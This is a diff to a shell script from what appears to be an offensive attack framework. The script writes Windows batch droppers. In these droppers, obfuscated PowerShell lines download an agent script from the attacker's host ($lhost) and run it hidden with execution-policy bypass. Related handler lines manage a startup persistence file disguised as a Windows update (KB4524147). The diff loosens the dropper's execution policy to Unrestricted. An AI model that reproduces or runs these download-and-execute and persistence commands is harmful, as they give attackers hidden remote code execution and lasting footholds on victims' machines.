@@ -12404,7 +12404,7 @@ else
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update' > Recent_OS_Updates.txt" >> $IPATH/output/$Drop.bat
    ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
-   echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.bat
+   echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
    ## Persistence Module Function (VBScript|BATch)
@@ -12548,7 +12548,7 @@ if [ "$persistence" = "Add persistence)" ]; then
    echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
    else
@@ -12660,7 +12660,7 @@ else
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update' > Recent_OS_Updates.txt" >> $IPATH/output/$Drop.$ext.bat
    ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
-   echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
+   echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
    ## Persistence Module Function (VBScript|BATch)
@@ -12788,7 +12788,7 @@ if [ "$persistence" = "Add persistence)" ]; then
    echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
    else
